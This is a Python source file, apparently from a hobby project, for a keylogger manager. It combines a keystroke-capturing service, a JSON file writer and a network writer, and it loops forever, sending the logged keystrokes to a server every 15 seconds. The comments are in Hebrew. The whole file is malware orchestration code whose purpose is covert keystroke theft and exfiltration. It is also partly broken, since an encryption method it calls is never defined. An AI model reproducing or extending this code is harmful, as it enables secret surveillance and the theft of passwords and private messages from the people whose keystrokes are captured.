from keyloggerservise import KeyloggerService
from file_writer import FileWriter
from network import NetworkWriter
import time

class KeyloggerManeger:
    def __init__(self):

        self.keylogger = KeyloggerService()
        self.file_writer = FileWriter()
        self.network_writer = NetworkWriter()
        self.f()



    def getdata(self):
       # return  self.keylogger.data
       return self.file_writer.save_to_json(self.keylogger.data)


    def crypt_data(self):
        encrypted_data = self.encrypt.xor(self.getdata())  # שמירת הפלט של ההצפנה
        return encrypted_data

    def send_data_to_server(self):


        data = self.getdata()
        if data:
            self.network_writer.send_data(data)

    def f(self):
        try:
            while True:
                time.sleep(15)  # כל 15 שניות שולח נתונים
                self.send_data_to_server()
        except KeyboardInterrupt:
            print("Keylogger stopped.")


maneger = KeyloggerManeger()


